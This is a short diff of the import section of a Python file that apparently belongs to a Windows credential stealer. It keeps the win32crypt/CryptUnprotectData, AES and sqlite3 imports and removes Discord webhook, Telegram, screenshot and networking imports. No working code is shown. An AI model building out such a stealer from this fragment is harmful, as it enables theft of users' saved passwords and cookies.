@@ -2,8 +2,6 @@ import os
 from datetime import datetime, timedelta
 from os import getenv, getlogin, listdir, walk
 import sqlite3
-from discord_webhook import DiscordWebhook, DiscordEmbed
-import discord
 import win32crypt
 import shutil
 import command
@@ -49,12 +47,6 @@ import sqlite3
 from datetime import datetime, timedelta
 from Crypto.Cipher import AES
 from win32crypt import CryptUnprotectData
-import base64; import getpass; import json; import os; import psutil
-import random; import io; import re; import requests; import shutil
-import socket; import ctypes; import asyncio; import sqlite3
-import telegram; import ssl; import zipfile; import platform 
-import subprocess; import PIL; import sys; import time
-import uuid; import pyautogui; import urllib; import requests_toolbelt
 from asyncio import *
 from Crypto.Cipher import AES
 from Crypto.Random import get_random_bytes
